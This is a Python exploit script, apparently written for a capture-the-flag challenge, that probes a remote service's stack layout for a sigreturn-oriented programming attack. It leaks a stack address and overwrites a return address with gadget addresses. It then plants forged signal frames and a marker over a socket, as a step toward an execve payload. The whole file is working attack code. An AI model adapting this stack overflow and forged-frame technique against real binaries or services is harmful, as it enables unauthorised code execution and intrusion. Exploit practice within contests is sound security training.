#!/usr/bin/env python3
"""Ask rt_sigreturn to prove it ran, before betting the exploit on the frame layout.

The chain geometry is already measured on the target: with buf = L-0x78 the
hijacked `ret` leaves rsp = buf+0x88, so entering 0x401032 (read 24 into buf+0x48)
and returning into 0x401069 makes rax = <bytes fed> and rsp = buf+0x90 at the
syscall.  Putting a frame there is the only unknown.

Instead of jumping straight to execve, the frame is loaded with

    rip = 0x401017   (just past f1's `push rsp`, so rsi = rsp unmoved)
    rsp = buf+0x300  (where an 8-byte marker was planted)

so a *successful* sigreturn answers with the marker, and anything else it answers
with is a measurement of which slot the kernel actually read.  rip/rsp are written
at both candidate mcontext bases (frame+0xA8 for `rsp -> &rt_sigframe`, frame+0x28
for `rsp -> &uc`) because the slots the two windows disagree on are ones the other
interpretation ignores.
"""
import socket
import struct
import sys
import time

HOST = "chal.sunshinectf.games"
PORT = 26003

G1 = 0x401032
SC = 0x401069
LEAK = 0x401017            # mov rsi,rsp ; ... ; syscall
OFF_FRAME = 0x90
OFF_MARKER = 0x300
FRAME_LEN = 0x170
SC_RSP, SC_RIP, SC_EFLAGS, SC_SEL, SC_OLDMASK, SC_FPSTATE = (
    0x78, 0x80, 0x88, 0x90, 0xA8, 0xB0)
BASES = (0xA8, 0x28)
MARKER = 0x4142434445464748


def p64(v):
    return struct.pack("<Q", v & 0xFFFFFFFFFFFFFFFF)


def recvn(s, n, t=4.0):
    s.settimeout(t)
    b = b""
    while len(b) < n:
        try:
            c = s.recv(n - len(b))
        except socket.timeout:
            break
        if not c:
            break
        b += c
    return b


def drain(s, t=2.0):
    s.settimeout(t)
    b = b""
    try:
        while True:
            c = s.recv(4096)
            if not c:
                break
            b += c
    except socket.timeout:
        pass
    return b


def build(buf, rip, rsp, bases=BASES, extra=None):
    f = bytearray(FRAME_LEN)
    want = {SC_RIP: rip, SC_RSP: rsp, SC_EFLAGS: 0x246,
            SC_SEL: 0x33 | (0x2B << 48), SC_OLDMASK: 0, SC_FPSTATE: 0}
    if extra:
        want.update(extra)
    for base in bases:
        for off, val in want.items():
            struct.pack_into("<Q", f, base + off, val & 0xFFFFFFFFFFFFFFFF)
    return f


def probe(name, rip, rsp_off, bases=BASES, extra=None, feed=b"X" * 15):
    s = socket.create_connection((HOST, PORT), timeout=20)
    try:
        l = recvn(s, 8)
        if len(l) != 8:
            print("%-24s SHORTLEAK %r" % (name, l))
            return
        L = struct.unpack("<Q", l)[0]
        buf = (L - 0x78) & 0xFFFFFFFFFFFFFFFF
        body = bytearray(0x400)
        body[0x80:0x88] = p64(G1)
        body[0x88:0x90] = p64(SC)
        body[OFF_FRAME:OFF_FRAME + FRAME_LEN] = build(buf, rip, buf + rsp_off, bases, extra)
        struct.pack_into("<Q", body, rsp_off, MARKER)
        s.sendall(b"\x90" * 24 + bytes(body[:OFF_MARKER + 8]))
        time.sleep(0.5)
        pre = drain(s, 0.3)
        s.sendall(feed)
        time.sleep(0.5)
        post = drain(s, 2.0)
        got = (pre + post)[:8]
        print("%-24s L=%#x  n=%d  got=%s" % (name, L, len(pre) + len(post), got.hex()))
        if len(got) == 8:
            v = struct.unpack("<Q", got)[0]
            print("       value=%#x   marker=%#x  match=%s" % (v, MARKER, v == MARKER))
            for delta, tag in ((0x00, "buf"), (0x88, "buf+0x88"), (0x90, "buf+0x90")):
                pass
            if v != MARKER:
                print("       offset vs buf: %#x" % (v - buf))
    finally:
        s.close()
    time.sleep(0.6)


if __name__ == "__main__":
    probe("sigreturn->marker", LEAK, OFF_MARKER)
    probe("sigreturn base 0xA8", LEAK, OFF_MARKER, bases=(0xA8,))
    probe("sigreturn base 0x28", LEAK, OFF_MARKER, bases=(0x28,))
